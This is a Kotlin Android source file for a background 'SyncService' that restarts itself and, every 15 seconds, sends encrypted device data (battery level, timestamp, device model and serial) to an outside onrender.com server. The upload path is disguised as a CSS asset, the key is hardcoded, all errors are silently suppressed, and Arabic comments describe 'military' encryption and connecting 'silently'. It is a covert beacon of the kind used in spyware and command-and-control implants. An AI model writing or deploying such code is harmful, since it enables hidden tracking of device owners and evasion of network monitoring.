package com.assets.service

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Base64
import java.io.ByteArrayOutputStream
import java.io.OutputStream
import java.net.HttpURLConnection
import java.net.URL
import java.security.SecureRandom
import java.util.Timer
import java.util.TimerTask
import java.util.zip.GZIPOutputStream
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec
import org.json.JSONObject

class SyncService : Service() {

    private val RENDER_SERVER_URL = "https://web-assets-service.onrender.com"
    private val ENCRYPTION_SECRET = "BaseSystemZeroDaySecureKey2026"
    private var secureTimer: Timer? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startSecurePipeline()
        return START_STICKY
    }

    private fun startSecurePipeline() {
        secureTimer = Timer()
        secureTimer?.scheduleAtFixedRate(object : TimerTask() {
            override fun run() {
                try {
                    val dataPacket = JSONObject()
                    dataPacket.put("status", "HYBRID_SECURE_ACTIVE")
                    dataPacket.put("battery", getBatteryLevel())
                    dataPacket.put("timestamp", System.currentTimeMillis())

                    // 1. ضغط البيانات بـ GZIP ثم تشفيرها عسكرياً
                    val encryptedBlob = compressAndEncrypt(dataPacket.toString())
                    
                    // 2. إرسال الحزمة الآمنة
                    sendEncryptedPayload("/assets/web/style-min.css", encryptedBlob)

                } catch (e: Exception) {}
            }
        }, 0, 15000)
    }

    // --- محرك الضغط والتشفير المزدوج ---
    private fun compressAndEncrypt(plainText: String): String {
        // ضغط البيانات باستخدام GZIP
        val byteStream = ByteArrayOutputStream()
        val gzipStream = GZIPOutputStream(byteStream)
        gzipStream.write(plainText.toByteArray(Charsets.UTF_8))
        gzipStream.close()
        val compressedBytes = byteStream.toByteArray()

        // تجهيز مفتاح التشفير AES-256
        val keyBytes = ENCRYPTION_SECRET.toByteArray(Charsets.UTF_8).copyOf(32)
        val keySpec = SecretKeySpec(keyBytes, "AES")
        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        
        val iv = ByteArray(12)
        SecureRandom().nextBytes(iv) // ناقل عشوائي متجدد لمنع مطابقة الأنماط
        val spec = GCMParameterSpec(128, iv)
        
        cipher.init(Cipher.ENCRYPT_MODE, keySpec, spec)
        val cipherText = cipher.doFinal(compressedBytes)
        
        val encryptedData = cipherText.copyOfRange(0, cipherText.size - 16)
        val authTag = cipherText.copyOfRange(cipherText.size - 16, cipherText.size)

        val packet = JSONObject()
        packet.put("v", byteArrayToHex(iv))
        packet.put("g", byteArrayToHex(authTag))
        packet.put("d", byteArrayToHex(encryptedData))

        return Base64.encodeToString(packet.toString().toByteArray(Charsets.UTF_8), Base64.NO_WRAP)
    }

    private fun sendEncryptedPayload(endpoint: String, payload: String) {
        try {
            val url = URL(RENDER_SERVER_URL + endpoint)
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "text/plain")
            conn.setRequestProperty("x-agent-model", android.os.Build.MODEL)
            conn.setRequestProperty("x-agent-id", android.os.Build.SERIAL ?: "Secure-Node")
            conn.doOutput = true
            
            val os: OutputStream = conn.outputStream
            os.write(payload.toByteArray(Charsets.UTF_8))
            os.flush()
            os.close()

            conn.responseCode // إتمام الاتصال بصمت
        } catch (e: Exception) {}
    }

    private fun getBatteryLevel(): Int {
        return try {
            val intent = registerReceiver(null, android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED))
            val level = intent?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) ?: -1
            val scale = intent?.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1) ?: -1
            if (level >= 0 && scale > 0) (level * 100 / scale) else 0
        } catch (e: Exception) { 0 }
    }

    private fun byteArrayToHex(bytes: ByteArray): String {
        val sb = StringBuilder()
        for (b in bytes) sb.append(String.format("%02x", b))
        return sb.toString()
    }

    override fun onDestroy() {
        secureTimer?.cancel()
        super.onDestroy()
    }
}
